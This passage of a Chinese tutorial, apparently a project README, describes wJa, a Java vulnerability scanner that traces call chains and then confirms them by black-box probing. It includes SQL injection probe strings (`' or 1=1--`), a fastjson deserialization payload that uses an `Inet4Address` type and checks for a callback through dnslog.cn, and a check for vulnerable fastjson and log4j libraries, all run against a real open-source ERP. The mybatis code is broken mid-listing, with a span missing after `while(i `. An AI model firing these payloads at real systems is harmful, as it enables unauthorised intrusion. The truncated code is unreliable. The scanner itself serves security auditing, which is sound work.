    #define filter2=Integer.valueOf(.*?
    #define filter3=Long.valueOf(.*?
    function filter(sentence,trackName){
        ap = trackName.".*?)";
        a = StrRe(sentence,filter1.ap);
        if(GetArrayNum(a) != 0){return 0;}
        a = StrRe(sentence,filter2.ap);
        if(GetArrayNum(a) != 0){return 0;}
        a = StrRe(sentence,filter3.ap);
        if(GetArrayNum(a) != 0){return 0;}
        return 1;
    }
后期会提供更加标准的规则。
如果不存在过滤函数则进入黑盒检测，这里通过注解拼接得到真正的测试连接，调用`judgeSQLI`方法判断此链接，通过or判断是否存在SQL注入：
    function judgeSQLI(api){
        res = HttpGet(api,cookie);
        res1 = HttpGet(api."%27%20or%201=1--+",cookie);
        if(GetStrLength(res1[0]) != GetStrLength(res[0])){
            res2 = HttpGet(api."%27%20or%202=1--+",cookie);
            if(GetStrLength(res2[0]) == GetStrLength(res[0])){
                return 1;
            }
        }
        return 0;
    }
最终看一下打印的信息。
可以看到最终成功打印出存在SQL注入的调用链并且黑盒测试存在漏洞。
细心的朋友可能发现这里面存在一条真实IAST调用链，这个是通过java agent注入得到的真实调用，可以看到确实进入了SQLI的危险函数。
## 案例2：获取危险库
靶场已经了解的差不多了，那么就进入实战操作，这里用到的实战项目是华夏ERP：
需要启动mysql和redis，并且进行简单的配置，这里就不赘述，可以根据项目github的readme进行操作。
同样的打开jar包。
wJa自带了一个检查危险库的方法，是通过扫描pom.xml导入的库判断是会否存在危险的库，源代码不贴了，运行结果：
可以看到存在危险的fastjson和log4j组件。
## 案例3：fastjson检测
与SQLI检测唯一的不同就是sink的函数是不同的，并且检测方法也是不同的。
sink函数fastjson的parseObject方法，所以应该这样子改变：`TrackVarIntoFun(className,methodName,argIndex,"com/alibaba/fastjson/JSONObject","parseObject",0,1);`
对于fastjson的检测最好借助dnslog，所以需要写一个dnslog的工具包：
    function getDnsLogDomain(){
        SetGlobalValue("dnslogCookie","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36".StrRN()."Cookie: PHPSESSID=wJa;");
        res = HttpGet("http://www.dnslog.cn/getdomain.php?t=0.02695357778962082",dnslogCookie);
        dns = StrSplit(res[0],StrRN());
        return dns[0];
    }
    function getDnsLogRecord(){
        res = HttpGet("http://www.dnslog.cn/getrecords.php?t=0.29442376629799494",dnslogCookie);
        rec = StrSplit(res[0],StrRN());
        return rec[0];
    }
通过获得dns域名，然后通过`java.net.Inet4Address`访问对应的dns查看回显判断是否真实存在反序列化漏洞。
    function judgeFastjson(api){
        domain = getDnsLogDomain();
        res1 = HttpGet(api."%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22".domain."%22%7D",cookie);
        Sleep(1000);
        if(getDnsLogRecord() != "[]"){
            return 1;
        }
        return 0;
    }
最终执行脚本发现存在对应的调用链：
发现有一条完整并且黑盒测试正常的调用链，下面也有测试不存在的，并且也检查到了存在过滤函数的。
通过这样子的测试可以挖取到所有的调用链，存在过滤函数或者测试失败的可以debug分析一下看看是否存在bypass的方法。
## 案例4：mybatis类型的SQLI
与普通的SQLI注入不同，这一个sink函数并不是固定的，而是通过xml文件进行动态设置的，这里也能体现出wJa的灵活性，可以灵活的应对不同的复杂场景。
### 获取所有映射的xml文件名称
    function GetConfigeFileMap(path){
        ap = GetFileContent(path);
        allPro = StrSplit(ap,StrRN());
        i = 0;
        size = GetArrayNum(allPro);
        res = GetHashMap();
        while(i "){
                            trackMybatisSQL(className,methods[i],classPath,j,mybatisClassName,curMybatisMethodName);
                        }
                        j = ToInt(j+1);
                    }
                    i = ToInt(i+1);
                }
                mybatisMethodIndex = ToInt(mybatisMethodIndex + 1);
            }
            xmlIndex = ToInt(xmlIndex + 1);
        }
        return 0;
    }
逻辑相对也是比较简单的，与之前不同的是需要动态传入sink类和方法，执行查看结果：
最终可以打印出所有调用链。
## 目前自带的漏洞检测脚本
虽然写了不少，但是还是需要根据所应对的场景自己进行修改。
## wJa的一些细节
wJa实现了流式算法，可以追踪包括map在内的变量跳转，并且会根据java的实现类和子类进行跳转扫描，保证所有调用链的完全扫描。
## wJa Link
如果存在错误或者bug，请在issue中提出，Wker将在两天内修复！
hxd写了这么多，给个Star吧Thanks♪(･ω･)ﾉ